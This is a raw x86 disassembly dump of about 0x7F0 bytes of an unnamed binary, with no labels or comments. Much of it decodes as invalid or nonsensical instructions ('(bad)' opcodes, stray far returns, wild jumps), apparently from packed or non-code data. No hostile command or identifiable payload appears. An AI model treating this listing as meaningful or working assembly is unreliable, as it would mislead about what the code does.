  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
